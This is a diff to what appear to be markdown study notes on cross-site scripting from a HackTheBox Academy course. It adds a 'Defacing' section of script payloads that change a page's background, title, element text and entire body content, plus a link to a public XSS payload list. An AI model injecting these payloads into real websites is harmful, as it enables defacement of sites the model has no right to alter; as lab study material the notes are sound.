@@ -11,8 +11,30 @@ Manually test payloads against input fields
 [PayloadBox](https://github.com/payloadbox/xss-payload-list)
 
 ### Code Review
+Review the source code for the page and the JS in Developer Tools
 
 ## Defacing
+### Changing the Background
+```html
+<script>document.body.style.background = "#141d2b"</script>
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>#Sets an image as background
+```
+### Change Page Title
+```html
+<script>document.title = 'HackTheBox Academy'</script>
+```
+### Change Page Text
+```javascript
+document.getElementById("todo").innerHTML = "New Text"
+$("#todo").html('New Text'); #jquery
+```
+### Change Entire Site
+```javascript
+document.getElementsByTagName('body')[0].innerHTML = "New Text"
+```
+```html
+<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
+```
 
 ## Stored XSS (Persistent XSS)
 
